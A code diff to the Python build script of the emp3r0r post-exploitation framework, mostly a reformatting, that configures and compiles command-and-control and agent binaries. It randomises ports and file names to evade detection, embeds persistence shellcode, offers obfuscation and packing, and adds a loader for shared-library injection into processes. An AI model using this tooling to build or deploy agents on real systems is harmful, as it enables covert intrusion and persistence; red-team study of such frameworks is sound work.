@@ -2,9 +2,9 @@
 
 # pylint: disable=invalid-name, too-many-branches, too-many-statements, broad-except, too-many-arguments, too-many-instance-attributes, line-too-long
 
-'''
+"""
 this script replaces build.sh, coz bash/sed/awk is driving me insane
-'''
+"""
 
 import argparse
 import atexit
@@ -22,12 +22,17 @@ import uuid
 
 
 class GoBuild:
-    '''
+    """
     all-in-one builder
-    '''
+    """
 
-    def __init__(self, target="cc",
-                 cc_indicator="cc_indicator", cc_ip="[cc_ipaddr]", cc_other_names=""):
+    def __init__(
+        self,
+        target="cc",
+        cc_indicator="cc_indicator",
+        cc_ip="[cc_ipaddr]",
+        cc_other_names="",
+    ):
         self.target = target
         self.GOOS = os.getenv("GOOS")
         self.GOARCH = os.getenv("GOARCH")
@@ -53,98 +58,99 @@ class GoBuild:
 
         # webroot
 
-        if 'webroot' in CACHED_CONF:
-            self.WebRoot = CACHED_CONF['webroot']
+        if "webroot" in CACHED_CONF:
+            self.WebRoot = CACHED_CONF["webroot"]
         else:
             self.WebRoot = str(uuid.uuid1())
-            CACHED_CONF['webroot'] = self.WebRoot
+            CACHED_CONF["webroot"] = self.WebRoot
 
         # OpSep
 
-        if 'opsep' in CACHED_CONF:
-            self.OpSep = CACHED_CONF['opsep']
+        if "opsep" in CACHED_CONF:
+            self.OpSep = CACHED_CONF["opsep"]
         else:
             self.OpSep = str(uuid.uuid1())
-            CACHED_CONF['opsep'] = self.OpSep
+            CACHED_CONF["opsep"] = self.OpSep
 
         # pid file name
 
-        if 'pid_file' in CACHED_CONF:
-            self.PIDFile = CACHED_CONF['pid_file']
+        if "pid_file" in CACHED_CONF:
+            self.PIDFile = CACHED_CONF["pid_file"]
         else:
             self.PIDFile = rand_str(random.randint(3, 10))
-            CACHED_CONF['pid_file'] = self.PIDFile
+            CACHED_CONF["pid_file"] = self.PIDFile
 
         # util path name
 
-        if 'utils_path' in CACHED_CONF:
-            self.UtilsPath = CACHED_CONF['utils_path']
+        if "utils_path" in CACHED_CONF:
+            self.UtilsPath = CACHED_CONF["utils_path"]
         else:
             self.UtilsPath = rand_str(random.randint(3, 10))
-            CACHED_CONF['utils_path'] = self.UtilsPath
+            CACHED_CONF["utils_path"] = self.UtilsPath
 
         # socket name
 
-        if 'socket' in CACHED_CONF:
-            self.Socket = CACHED_CONF['socket']
+        if "socket" in CACHED_CONF:
+            self.Socket = CACHED_CONF["socket"]
         else:
             self.Socket = rand_str(random.randint(3, 10))
-            CACHED_CONF['socket'] = self.Socket
+            CACHED_CONF["socket"] = self.Socket
 
         # indicator text
 
-        if 'indicator_text' in CACHED_CONF:
-            self.INDICATOR_TEXT = CACHED_CONF['indicator_text']
+        if "indicator_text" in CACHED_CONF:
+            self.INDICATOR_TEXT = CACHED_CONF["indicator_text"]
         else:
             self.INDICATOR_TEXT = "emp3r0r"
-            CACHED_CONF['indicator_text'] = self.INDICATOR_TEXT
+            CACHED_CONF["indicator_text"] = self.INDICATOR_TEXT
 
         # agent root directory
 
         if "agent_root" in CACHED_CONF:
-            self.AgentRoot = CACHED_CONF['agent_root']
+            self.AgentRoot = CACHED_CONF["agent_root"]
         else:
             # by default mkdir in current directory
             self.AgentRoot = f"{rand_str(random.randint(5, 10))}"
 
-            CACHED_CONF['agent_root'] = self.AgentRoot
+            CACHED_CONF["agent_root"] = self.AgentRoot
 
         # DoH
 
         if "doh_server" not in CACHED_CONF:
-            CACHED_CONF['doh_server'] = ""
+            CACHED_CONF["doh_server"] = ""
 
         # agent proxy
 
         if "agent_proxy" not in CACHED_CONF:
-            CACHED_CONF['agent_proxy'] = ""
+            CACHED_CONF["agent_proxy"] = ""
 
         # cdn proxy
 
         if "cdn_proxy" not in CACHED_CONF:
-            CACHED_CONF['cdn_proxy'] = ""
+            CACHED_CONF["cdn_proxy"] = ""
 
     def build(self):
-        '''
+        """
         cd to cmd and run go build
-        '''
+        """
         self.gen_certs()
         # CA
 
-        if 'ca' in CACHED_CONF:
+        if "ca" in CACHED_CONF:
             log_warn(
-                f"Using cached CA cert ({CACHED_CONF['ca']}),\nmake sure you have the coresponding keypair signed by it")
-            self.CA = CACHED_CONF['ca']
+                f"Using cached CA cert ({CACHED_CONF['ca']}),\nmake sure you have the coresponding keypair signed by it"
+            )
+            self.CA = CACHED_CONF["ca"]
         else:
             f = open("./tls/rootCA.crt")
             self.CA = f.read()
             f.close()
 
             # cache CA, too
-            CACHED_CONF['ca'] = self.CA
+            CACHED_CONF["ca"] = self.CA
 
         # cache version
-        CACHED_CONF['version'] = self.VERSION
+        CACHED_CONF["version"] = self.VERSION
 
         # write cached configs
         json_file = open(BUILD_JSON, "w+")
@@ -178,16 +184,20 @@ class GoBuild:
             build_target = f"../../build/{self.target}-{self.UUID}.exe"
 
         # go mod
-        os.system('go mod tidy')
+        os.system("go mod tidy")
 
-        cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
-            f""" go build -o {build_target} -ldflags='-s -w' -trimpath"""
+        cmd = (
+            f"""GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0"""
+            + f""" go build -o {build_target} -ldflags='-s -w' -trimpath"""
+        )
 
         # garble
 
         if shutil.which("garble") and self.target != "cc" and args.garble:
-            cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0 GOPRIVATE=''' + \
-                f''' garble -literals -tiny build -o {build_target} -ldflags="-v" -trimpath .'''
+            cmd = (
+                f"""GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0 GOPRIVATE="""
+                + f""" garble -literals -tiny build -o {build_target} -ldflags="-v" -trimpath ."""
+            )
 
         os.system(cmd)
         log_warn("GO BUILD ends...")
@@ -203,7 +213,12 @@ class GoBuild:
             log_error("go build failed")
             sys.exit(1)
 
-        # pack agent binary with packer
+        if self.target == "agent" and args.dll and not args.pack:
+            os.chdir("../loader/elf")
+            os.system("make")
+            shutil.move("loader.so", "../../core/build/loader.so")
+            os.chdir("../../core")
+            log_warn("loader.so can be found under ./build")
 
         if self.target == "agent" and args.pack:
             shutil.copy(targetFile, "../packer/agent")
@@ -217,31 +232,33 @@ class GoBuild:
             log_warn(f"{targetFile} packed")
 
     def gen_certs(self):
-        '''
+        """
         generate server cert/key, and CA if necessary
-        '''
+        """
 
         if "ccip" in CACHED_CONF:
-            if self.CCIP == CACHED_CONF['ccip'] and os.path.exists("./build/emp3r0r-key.pem"):
+            if self.CCIP == CACHED_CONF["ccip"] and os.path.exists(
+                "./build/emp3r0r-key.pem"
+            ):
                 return
 
         log_warn("[!] Generating new certs...")
         try:
             os.chdir("./tls")
             os.system(
-                f"bash ./genkey-with-ip-san.sh {self.UUID} {self.UUID}.com {self.CCIP} {self.CC_OTHER_NAMES}")
+                f"bash ./genkey-with-ip-san.sh {self.UUID} {self.UUID}.com {self.CCIP} {self.CC_OTHER_NAMES}"
+            )
             os.rename(f"./{self.UUID}-cert.pem", "./emp3r0r-cert.pem")
             os.rename(f"./{self.UUID}-key.pem", "./emp3r0r-key.pem")
             os.chdir("..")
         except BaseException as exc:
-            log_error(
-                f"[-] Something went wrong, see above for details: {exc}")
+            log_error(f"[-] Something went wrong, see above for details: {exc}")
             sys.exit(1)
 
     def set_tags(self):
-        '''
+        """
         modify some tags in the source
-        '''
+        """
 
         # backup source file
         try:
@@ -253,15 +270,24 @@ class GoBuild:
             sys.exit(1)
 
         # version
-        sed("./lib/data/def.go",
-            '''Version = "[version_string]"''', f'''Version = "{self.VERSION}"''')
+        sed(
+            "./lib/data/def.go",
+            '''Version = "[version_string]"''',
+            f'''Version = "{self.VERSION}"''',
+        )
 
         if self.target == "agent":
             # guardian shellcode
-            sed("./lib/data/def.go",
-                "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
-            sed("./lib/data/def.go",
-                "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
+            sed(
+                "./lib/data/def.go",
+                "[persistence_shellcode]",
+                CACHED_CONF["guardian_shellcode"],
+            )
+            sed(
+                "./lib/data/def.go",
+                "[persistence_agent_path]",
+                CACHED_CONF["guardian_agent_path"],
+            )
 
         # CA
         sed("./lib/tun/tls.go", "[emp3r0r_ca]", self.CA)
@@ -270,89 +296,145 @@ class GoBuild:
         sed("./lib/tun/api.go", 'WebRoot = "emp3r0r"', f'WebRoot = "{self.WebRoot}"')
 
         # opsep
-        sed("./lib/data/def.go",
+        sed(
+            "./lib/data/def.go",
             '''OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"''',
-            f'''OpSep = "{self.OpSep}"''')
+            f'''OpSep = "{self.OpSep}"''',
+        )
 
         # Socket name
-        sed("./lib/data/def.go",
+        sed(
+            "./lib/data/def.go",
             '''SocketName = AgentRoot + "/.socket"''',
-            f'''SocketName = AgentRoot + "/{self.Socket}"''')
+            f'''SocketName = AgentRoot + "/{self.Socket}"''',
+        )
 
         # utils path
-        sed("./lib/data/def.go",
+        sed(
+            "./lib/data/def.go",
             '''UtilsPath = AgentRoot + "/bin"''',
-            f'''UtilsPath = AgentRoot + "/{self.UtilsPath}"''')
+            f'''UtilsPath = AgentRoot + "/{self.UtilsPath}"''',
+        )
 
         # PID file name
-        sed("./lib/data/def.go",
+        sed(
+            "./lib/data/def.go",
             '''PIDFile = AgentRoot + "/.pid"''',
-            f'''PIDFile = AgentRoot + "/{self.PIDFile}"''')
+            f'''PIDFile = AgentRoot + "/{self.PIDFile}"''',
+        )
 
         # CC IP
-        sed("./lib/data/def.go",
-            "CCAddress = \"https://[cc_ipaddr]\"", f"CCAddress = \"https://{self.CCIP}\"")
+        sed(
+            "./lib/data/def.go",
+            'CCAddress = "https://[cc_ipaddr]"',
+            f'CCAddress = "https://{self.CCIP}"',
+        )
 
         # agent root path
-        sed("./lib/data/def.go",
-            "AgentRoot = \"[agent_root]\"", f"AgentRoot = \"{self.AgentRoot}\"")
+        sed(
+            "./lib/data/def.go",
+            'AgentRoot = "[agent_root]"',
+            f'AgentRoot = "{self.AgentRoot}"',
+        )
 
         # indicator
-        sed("./lib/data/def.go",
-            "CCIndicator = \"[cc_indicator]\"", f"CCIndicator = \"{self.INDICATOR}\"")
+        sed(
+            "./lib/data/def.go",
+            'CCIndicator = "[cc_indicator]"',
+            f'CCIndicator = "{self.INDICATOR}"',
+        )
 
         # indicator wait
 
-        if 'indicator_wait_min' in CACHED_CONF:
-            sed("./lib/data/def.go",
-                "IndicatorWaitMin = 30", f"IndicatorWaitMin = {CACHED_CONF['indicator_wait_min']}")
+        if "indicator_wait_min" in CACHED_CONF:
+            sed(
+                "./lib/data/def.go",
+                "IndicatorWaitMin = 30",
+                f"IndicatorWaitMin = {CACHED_CONF['indicator_wait_min']}",
+            )
 
-        if 'indicator_wait_max' in CACHED_CONF:
-            sed("./lib/data/def.go",
-                "IndicatorWaitMax = 120", f"IndicatorWaitMax = {CACHED_CONF['indicator_wait_max']}")
+        if "indicator_wait_max" in CACHED_CONF:
+            sed(
+                "./lib/data/def.go",
+                "IndicatorWaitMax = 120",
+                f"IndicatorWaitMax = {CACHED_CONF['indicator_wait_max']}",
+            )
 
         # broadcast_interval
 
-        if 'broadcast_interval_min' in CACHED_CONF:
-            sed("./lib/data/def.go",
-                "BroadcastIntervalMin = 30", f"BroadcastIntervalMin = {CACHED_CONF['broadcast_interval_min']}")
+        if "broadcast_interval_min" in CACHED_CONF:
+            sed(
+                "./lib/data/def.go",
+                "BroadcastIntervalMin = 30",
+                f"BroadcastIntervalMin = {CACHED_CONF['broadcast_interval_min']}",
+            )
 
-        if 'broadcast_interval_max' in CACHED_CONF:
-            sed("./lib/data/def.go",
-                "BroadcastIntervalMax = 120", f"BroadcastIntervalMax = {CACHED_CONF['broadcast_interval_max']}")
+        if "broadcast_interval_max" in CACHED_CONF:
+            sed(
+                "./lib/data/def.go",
+                "BroadcastIntervalMax = 120",
+                f"BroadcastIntervalMax = {CACHED_CONF['broadcast_interval_max']}",
+            )
 
         # cc indicator text
-        sed("./lib/data/def.go",
-            "CCIndicatorText = \"[indicator_text]\"", f"CCIndicatorText = \"{self.INDICATOR_TEXT}\"")
+        sed(
+            "./lib/data/def.go",
+            'CCIndicatorText = "[indicator_text]"',
+            f'CCIndicatorText = "{self.INDICATOR_TEXT}"',
+        )
 
         # agent UUID
-        sed("./lib/data/def.go",
-            "AgentUUID = \"[agent_uuid]\"", f"AgentUUID = \"{self.UUID}\"")
+        sed(
+            "./lib/data/def.go",
+            'AgentUUID = "[agent_uuid]"',
+            f'AgentUUID = "{self.UUID}"',
+        )
 
         # DoH
-        sed("./lib/data/def.go",
-            "DoHServer = \"\"", f"DoHServer = \"{CACHED_CONF['doh_server']}\"")
+        sed(
+            "./lib/data/def.go",
+            'DoHServer = ""',
+            f"DoHServer = \"{CACHED_CONF['doh_server']}\"",
+        )
 
         # CDN
-        sed("./lib/data/def.go",
-            "CDNProxy = \"\"", f"CDNProxy = \"{CACHED_CONF['cdn_proxy']}\"")
+        sed(
+            "./lib/data/def.go",
+            'CDNProxy = ""',
+            f"CDNProxy = \"{CACHED_CONF['cdn_proxy']}\"",
+        )
 
         # Agent Proxy
-        sed("./lib/data/def.go",
-            "AgentProxy = \"\"", f"AgentProxy = \"{CACHED_CONF['agent_proxy']}\"")
+        sed(
+            "./lib/data/def.go",
+            'AgentProxy = ""',
+            f"AgentProxy = \"{CACHED_CONF['agent_proxy']}\"",
+        )
 
         # ports
-        sed("./lib/data/def.go",
-            "CCPort = \"[cc_port]\"", f"CCPort = \"{CACHED_CONF['cc_port']}\"")
+        sed(
+            "./lib/data/def.go",
+            'CCPort = "[cc_port]"',
+            f"CCPort = \"{CACHED_CONF['cc_port']}\"",
+        )
 
-        sed("./lib/data/def.go",
-            "SSHDPort = \"[sshd_port]\"", f"SSHDPort = \"{CACHED_CONF['sshd_port']}\"")
+        sed(
+            "./lib/data/def.go",
+            'SSHDPort = "[sshd_port]"',
+            f"SSHDPort = \"{CACHED_CONF['sshd_port']}\"",
+        )
 
-        sed("./lib/data/def.go",
-            "ProxyPort = \"[proxy_port]\"", f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"")
+        sed(
+            "./lib/data/def.go",
+            'ProxyPort = "[proxy_port]"',
+            f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"",
+        )
 
-        sed("./lib/data/def.go",
-            "BroadcastPort = \"[broadcast_port]\"", f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"")
+        sed(
+            "./lib/data/def.go",
+            'BroadcastPort = "[broadcast_port]"',
+            f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"",
+        )
 
     def unset_tags(self):
         # restore source files
@@ -365,11 +447,15 @@ class GoBuild:
 
 
 def clean():
-    '''
+    """
     clean build output
-    '''
-    to_rm = glob.glob("./tls/emp3r0r*") + glob.glob("./tls/openssl-*") + \
-        glob.glob("./build/*") + glob.glob("./tls/*.csr")
+    """
+    to_rm = (
+        glob.glob("./tls/emp3r0r*")
+        + glob.glob("./tls/openssl-*")
+        + glob.glob("./build/*")
+        + glob.glob("./tls/*.csr")
+    )
 
     for f in to_rm:
         try:
@@ -383,15 +469,15 @@ def clean():
                 if f.endswith("build.json"):
                     continue
                 os.remove(f)
-            print(" Deleted "+f)
+            print(" Deleted " + f)
         except BaseException:
             log_error(traceback.format_exc)
 
 
 def sed(path, old, new):
-    '''
+    """
     works like `sed -i s/old/new/g file`
-    '''
+    """
     rf = open(path)
     text = rf.read()
     to_write = text.replace(old, new)
@@ -403,9 +489,9 @@ def sed(path, old, new):
 
 
 def yes_no(prompt):
-    '''
+    """
     y/n?
-    '''
+    """
 
     if yes_to_all:
         log_warn(f"Choosing 'yes' for '{prompt}'")
@@ -421,10 +507,10 @@ def yes_no(prompt):
 
 
 def rand_str(length):
-    '''
+    """
     random string
-    '''
-    uuidstr = str(uuid.uuid4()).replace('-', '')
+    """
+    uuidstr = str(uuid.uuid4()).replace("-", "")
 
     # we don't want the string to be long
 
@@ -435,9 +521,9 @@ def rand_str(length):
 
 
 def main(target):
-    '''
+    """
     main main main
-    '''
+    """
     ccip = ""
     indicator = ""
     use_cached = False
@@ -450,24 +536,25 @@ def main(target):
     # cc IP
 
     if "ccip" in CACHED_CONF:
-        ccip = CACHED_CONF['ccip']
+        ccip = CACHED_CONF["ccip"]
         use_cached = yes_no(f"Use cached CC address ({ccip})?")
 
     if not use_cached:
         if yes_no("Clean everything and start over?"):
             clean()
         ccip = input(
-            "CC server address (domain name or ip address, can be more than one, separate with space):\n> ").strip()
-        CACHED_CONF['ccip'] = ccip
+            "CC server address (domain name or ip address, can be more than one, separate with space):\n> "
+        ).strip()
+        CACHED_CONF["ccip"] = ccip
 
         if len(ccip.split()) > 1:
-            CACHED_CONF['ccip'] = ccip.split()[0]
+            CACHED_CONF["ccip"] = ccip.split()[0]
 
     if target == "cc":
         cc_other = ""
 
         if len(ccip.split()) > 1:
-            cc_other = ' '.join(ccip[1:])
+            cc_other = " ".join(ccip[1:])
 
         gobuild = GoBuild(target="cc", cc_ip=ccip, cc_other_names=cc_other)
         gobuild.build()
@@ -484,93 +571,90 @@ def main(target):
     use_cached = False
 
     if "cc_indicator" in CACHED_CONF:
-        indicator = CACHED_CONF['cc_indicator']
+        indicator = CACHED_CONF["cc_indicator"]
         use_cached = yes_no(f"Use cached CC indicator ({indicator})?")
 
     if not use_cached:
-        indicator = input(
-            "CC status indicator URL (leave empty to disable): ").strip()
-        CACHED_CONF['cc_indicator'] = indicator
+        indicator = input("CC status indicator URL (leave empty to disable): ").strip()
+        CACHED_CONF["cc_indicator"] = indicator
 
-    if CACHED_CONF['cc_indicator'] != "":
+    if CACHED_CONF["cc_indicator"] != "":
         # indicator text
         use_cached = False
 
         if "indicator_text" in CACHED_CONF:
             use_cached = yes_no(
-                f"Use cached CC indicator text ({CACHED_CONF['indicator_text']})?")
+                f"Use cached CC indicator text ({CACHED_CONF['indicator_text']})?"
+            )
 
         if not use_cached:
             indicator_text = input(
-                "CC status indicator text (leave empty to disable): ").strip()
-            CACHED_CONF['indicator_text'] = indicator_text
+                "CC status indicator text (leave empty to disable): "
+            ).strip()
+            CACHED_CONF["indicator_text"] = indicator_text
 
     # Agent proxy
     use_cached = False
 
     if "agent_proxy" in CACHED_CONF:
-        use_cached = yes_no(
-            f"Use cached agent proxy ({CACHED_CONF['agent_proxy']})?")
+        use_cached = yes_no(f"Use cached agent proxy ({CACHED_CONF['agent_proxy']})?")
 
     if not use_cached:
-        agentproxy = input(
-            "Proxy server for agent (leave empty to disable): ").strip()
-        CACHED_CONF['agent_proxy'] = agentproxy
+        agentproxy = input("Proxy server for agent (leave empty to disable): ").strip()
+        CACHED_CONF["agent_proxy"] = agentproxy
 
     # CDN
     use_cached = False
 
     if "cdn_proxy" in CACHED_CONF:
-        use_cached = yes_no(
-            f"Use cached CDN server ({CACHED_CONF['cdn_proxy']})?")
+        use_cached = yes_no(f"Use cached CDN server ({CACHED_CONF['cdn_proxy']})?")
 
     if not use_cached:
         cdn = input("CDN websocket server (leave empty to disable): ").strip()
-        CACHED_CONF['cdn_proxy'] = cdn
+        CACHED_CONF["cdn_proxy"] = cdn
 
     # DoH
     use_cached = False
 
     if "doh_server" in CACHED_CONF:
-        use_cached = yes_no(
-            f"Use cached DoH server ({CACHED_CONF['doh_server']})?")
+        use_cached = yes_no(f"Use cached DoH server ({CACHED_CONF['doh_server']})?")
 
     if not use_cached:
         doh = input("DNS over HTTP server (leave empty to disable): ").strip()
-        CACHED_CONF['doh_server'] = doh
+        CACHED_CONF["doh_server"] = doh
 
     # guardian shellcode
     path = f"/tmp/{next(tempfile._get_candidate_names())}"
-    CACHED_CONF['guardian_shellcode'] = gen_guardian_shellcode(path)
-    CACHED_CONF['guardian_agent_path'] = path
+    CACHED_CONF["guardian_shellcode"] = gen_guardian_shellcode(path)
+    CACHED_CONF["guardian_agent_path"] = path
 
     # option to disable autoproxy and broadcasting
 
     if not yes_no("Use autoproxy (will enable UDP broadcasting)"):
-        CACHED_CONF['broadcast_interval_max'] = 0
+        CACHED_CONF["broadcast_interval_max"] = 0
 
     gobuild = GoBuild(target=target, cc_indicator=indicator, cc_ip=ccip)
     gobuild.build()
 
 
 def log_error(msg):
-    '''
+    """
     print in red
-    '''
-    print("\u001b[31m"+msg+"\u001b[0m")
+    """
+    print("\u001b[31m" + msg + "\u001b[0m")
 
 
 def log_warn(msg):
-    '''
+    """
     print in yellow
-    '''
-    print("\u001b[33m"+msg+"\u001b[0m")
+    """
+    print("\u001b[33m" + msg + "\u001b[0m")
 
 
 def save(prev_h_len, hfile):
-    '''
+    """
     append to histfile
-    '''
+    """
     new_h_len = readline.get_current_history_length()
     readline.set_history_length(1000)
     readline.append_history_file(new_h_len - prev_h_len, hfile)
@@ -590,36 +674,36 @@ if os.path.exists(BUILD_JSON):
 
 
 def rand_port():
-    '''
+    """
     returns a random int between 1024 and 65535
-    '''
+    """
 
     return str(random.randint(1025, 65534))
 
 
 def randomize_ports():
-    '''
+    """
     randomize every port used by emp3r0r agent,
     cache them in build.json
-    '''
+    """
 
-    if 'cc_port' not in CACHED_CONF:
-        CACHED_CONF['cc_port'] = rand_port()
+    if "cc_port" not in CACHED_CONF:
+        CACHED_CONF["cc_port"] = rand_port()
 
-    if 'sshd_port' not in CACHED_CONF:
-        CACHED_CONF['sshd_port'] = rand_port()
+    if "sshd_port" not in CACHED_CONF:
+        CACHED_CONF["sshd_port"] = rand_port()
 
-    if 'proxy_port' not in CACHED_CONF:
-        CACHED_CONF['proxy_port'] = rand_port()
+    if "proxy_port" not in CACHED_CONF:
+        CACHED_CONF["proxy_port"] = rand_port()
 
-    if 'broadcast_port' not in CACHED_CONF:
-        CACHED_CONF['broadcast_port'] = rand_port()
+    if "broadcast_port" not in CACHED_CONF:
+        CACHED_CONF["broadcast_port"] = rand_port()
 
 
 def gen_guardian_shellcode(path):
-    '''
+    """
     ../shellcode/gen.py
-    '''
+    """
 
     if not shutil.which("nasm"):
         log_error("nasm not found")
@@ -629,10 +713,10 @@ def gen_guardian_shellcode(path):
         out = subprocess.check_output(["python3", "gen.py", path])
         os.chdir(pwd)
 
-        shellcode = out.decode('utf-8')
+        shellcode = out.decode("utf-8")
 
         if "\\x48" not in shellcode:
-            log_error("Failed to generate shellcode: "+out)
+            log_error("Failed to generate shellcode: " + out)
 
             return "N/A"
     except BaseException:
@@ -644,22 +728,22 @@ def gen_guardian_shellcode(path):
 
 
 def get_version():
-    '''
+    """
     print current version
-    '''
+    """
     try:
         check = "git describe --tags"
         out = subprocess.check_output(
-            ["/bin/sh", "-c", check],
-            stderr=subprocess.STDOUT, timeout=3)
+            ["/bin/sh", "-c", check], stderr=subprocess.STDOUT, timeout=3
+        )
     except KeyboardInterrupt:
         return "Unknown"
     except BaseException:
         check = "git describe --always"
         try:
             out = subprocess.check_output(
-                ["/bin/sh", "-c", check],
-                stderr=subprocess.STDOUT, timeout=3)
+                ["/bin/sh", "-c", check], stderr=subprocess.STDOUT, timeout=3
+            )
         except BaseException:
             try:
                 versionf = open(".version")
@@ -677,16 +761,33 @@ def get_version():
 yes_to_all = False
 
 parser = argparse.ArgumentParser(description="Build emp3r0r CC/Agent bianaries")
-parser.add_argument('--target', type=str, required=True,
-                    help='Build target, can be cc/agent/agentw')
-parser.add_argument('--pack', action="store_true", required=False,
-                    help='Pack agent binary, only available under Linux, do not use with --dll')
-parser.add_argument('--dll', action="store_true", required=False,
-                    help='Load agent binary into any processes using shared library injection')
-parser.add_argument('--garble', action="store_true", required=False,
-                    help='Obfuscate agent binary with garble')
-parser.add_argument('--yes', action="store_true", required=False,
-                    help='Do not ask questions, take default answers')
+parser.add_argument(
+    "--target", type=str, required=True, help="Build target, can be cc/agent/agentw"
+)
+parser.add_argument(
+    "--pack",
+    action="store_true",
+    required=False,
+    help="Pack agent binary, only available under Linux, do not use with --dll",
+)
+parser.add_argument(
+    "--dll",
+    action="store_true",
+    required=False,
+    help="Load agent binary into any processes using shared library injection",
+)
+parser.add_argument(
+    "--garble",
+    action="store_true",
+    required=False,
+    help="Obfuscate agent binary with garble",
+)
+parser.add_argument(
+    "--yes",
+    action="store_true",
+    required=False,
+    help="Do not ask questions, take default answers",
+)
 args = parser.parse_args()
 
 if args.yes:
@@ -704,7 +805,7 @@ try:
         readline.read_history_file(histfile)
         h_len = readline.get_current_history_length()
     except FileNotFoundError:
-        open(histfile, 'wb').close()
+        open(histfile, "wb").close()
         h_len = 0
     atexit.register(save, h_len, histfile)
 
